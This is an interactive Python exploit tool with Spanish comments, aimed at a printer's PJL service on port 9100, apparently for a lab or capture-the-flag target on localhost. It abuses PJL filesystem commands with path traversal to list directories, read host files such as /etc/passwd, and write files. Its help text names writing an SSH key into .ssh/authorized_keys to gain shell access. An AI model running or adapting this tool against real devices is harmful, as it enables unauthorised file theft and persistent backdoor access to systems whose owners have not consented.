#!/usr/bin/env python3
import socket
import sys
import time

def pjl_command(sock, cmd):
    """Envía un comando PJL formateado correctamente"""
    # PJL requiere el prefijo @PJL y terminar con \r\n
    full_cmd = f"@PJL {cmd}\r\n"
    sock.sendall(full_cmd.encode())
    
    # Esperar y recibir respuesta
    time.sleep(0.3)  # Dar tiempo al servidor
    response = b""
    sock.settimeout(2.0)
    
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        except socket.timeout:
            break
    
    return response.decode(errors='ignore')

def pjl_fsquery(sock, filepath):
    """Consulta un archivo específico"""
    # FSQUERY para ver si existe y obtener info
    cmd = f'FSQUERY NAME="0:/{filepath}"'
    return pjl_command(sock, cmd)

def pjl_fsdirlist(sock, path):
    """Lista contenido de un directorio"""
    # FSDIRLIST para listar directorios
    cmd = f'FSDIRLIST NAME="0:/{path}" ENTRY=1 COUNT=999'
    return pjl_command(sock, cmd)

def pjl_fswrite(sock, filepath, content):
    """Escribe contenido a un archivo (para poner tu clave SSH)"""
    # FSDOWNLOAD para escribir archivos
    size = len(content)
    cmd = f'FSDOWNLOAD NAME="0:/{filepath}" SIZE={size}\r\n'
    sock.sendall(f"@PJL {cmd}".encode())
    sock.sendall(content.encode())
    sock.sendall(b'\r\n')
    time.sleep(0.5)
    
    # Recibir confirmación
    sock.settimeout(2.0)
    response = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    
    return response.decode(errors='ignore')

def main():
    print("[*] Conectando a PJL en 127.0.0.1:9100...")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('127.0.0.1', 9100))
        sock.settimeout(5.0)
        print("[+] Conectado!")
        
        # Enviar UEL (Universal Exit Language) para entrar en modo PJL
        sock.sendall(b'\x1b%-12345X@PJL\r\n')
        time.sleep(0.5)
        
        # Recibir banner inicial
        banner = sock.recv(4096).decode(errors='ignore')
        print(f"[+] Banner: {banner[:200]}")
        
    except Exception as e:
        print(f"[-] Error de conexión: {e}")
        return

    print("\n[*] Comandos disponibles:")
    print("    ls <path>        - Listar directorio (ej: ls ../..)")
    print("    cat <file>       - Leer archivo (ej: cat ../../../etc/passwd)")
    print("    write <file>      - Escribir archivo (para .ssh/authorized_keys)")
    print("    query <file>      - Verificar si existe archivo")
    print("    exit             - Salir")
    print("")

    while True:
        try:
            user_input = input("PJL> ").strip()
        except EOFError:
            break
            
        if not user_input:
            continue
            
        if user_input.lower() == 'exit':
            break
            
        parts = user_input.split(' ', 1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""

        try:
            if cmd == 'ls':
                # Listar directorio
                path = arg if arg else "."
                print(f"[*] Listando: {path}")
                resp = pjl_fsdirlist(sock, path)
                print(resp)
                
            elif cmd == 'cat':
                # Leer archivo - usar FSUPLOAD para descargar contenido
                if not arg:
                    print("Uso: cat <ruta/archivo>")
                    continue
                print(f"[*] Leyendo: {arg}")
                # Intentar leer con FSUPLOAD
                resp = pjl_command(sock, f'FSUPLOAD NAME="0:/{arg}" OFFSET=0 SIZE=99999')
                print(resp)
                
            elif cmd == 'query':
                # Verificar si existe
                if not arg:
                    print("Uso: query <ruta>")
                    continue
                resp = pjl_fsquery(sock, arg)
                print(resp)
                
            elif cmd == 'write':
                # Modo interactivo para escribir archivo
                if not arg:
                    print("Uso: write <ruta/archivo>")
                    continue
                print("[*] Escribe el contenido (Ctrl+D o línea vacía para terminar):")
                content_lines = []
                while True:
                    try:
                        line = input()
                        if line == "":
                            break
                        content_lines.append(line)
                    except EOFError:
                        break
                content = '\n'.join(content_lines) + '\n'
                resp = pjl_fswrite(sock, arg, content)
                print(f"[+] Respuesta: {resp}")
                
            elif cmd == 'info':
                # Info del dispositivo
                resp = pjl_command(sock, 'INFO PAGECOUNT')
                print(resp)
                resp = pjl_command(sock, 'INFO VARIABLES')
                print(resp[:2000])  # Limitar output
                
            else:
                # Comando raw PJL
                resp = pjl_command(sock, user_input)
                print(resp)
                
        except Exception as e:
            print(f"[-] Error: {e}")
            # Reconectar si es necesario
            try:
                sock.close()
            except:
                pass
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect(('127.0.0.1', 9100))
                sock.sendall(b'\x1b%-12345X@PJL\r\n')
            except:
                print("[-] No se pudo reconectar")
                break

    print("[*] Cerrando conexión...")
    sock.close()

if __name__ == "__main__":
    main()
